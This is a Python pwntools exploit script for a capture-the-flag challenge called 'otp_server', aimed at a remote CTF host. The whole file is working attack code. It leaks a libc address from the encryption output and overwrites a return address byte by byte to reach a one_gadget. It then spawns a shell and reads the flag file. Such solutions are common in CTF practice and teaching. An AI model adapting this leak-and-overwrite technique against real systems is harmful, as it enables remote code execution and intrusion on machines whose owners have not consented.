from pwn import *

bin = ELF('./otp_server')
libc = ELF('./libc-2.27.so')

# context.log_level = 'debug'
one_gadget_offset = 0x10a38c


def SetKey(key):
    conn.sendafter('>>> ', str(1))
    conn.sendafter('Enter key:\n', key)


def Encrypt(msg):
    conn.sendafter('>>> ', str(2))
    conn.sendafter('Enter message to encrypt:\n', msg)


# conn = process('./otp_server', env={'LD_PRELOAD':'./libc-2.27.so'})
# gdb.attach(conn, '')
conn = remote('challenges.fbctf.com', 1338)

SetKey('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
Encrypt('B'*0x100)
conn.recvuntil('-----\n')
conn.recv(0x118)
libc_addr = u64(conn.recv(8)) - 0x21b97
one_gadget_addr = libc_addr + one_gadget_offset

log.info('libc_addr: ' + hex(libc_addr))
log.info('one_gadget_addr: ' + hex(one_gadget_addr))


key = 'AAAAAAAAAAAAAAAAAAA\x00'
for i in range(8):
    key = 'A' + key
    SetKey(key)

    while True:
        find_byte = (one_gadget_addr >> (8 * i)) & 0xff

        Encrypt('B'*0x100)
        conn.recvuntil('-----\n')
        val = u8(conn.recv(1)) ^ 0x41

        if val == find_byte:
            log.info(hex(find_byte)+' matched')
            break

conn.sendafter('>>> ', str(3))
conn.sendline('cd home;cd otp_server;cat flag')
conn.interactive()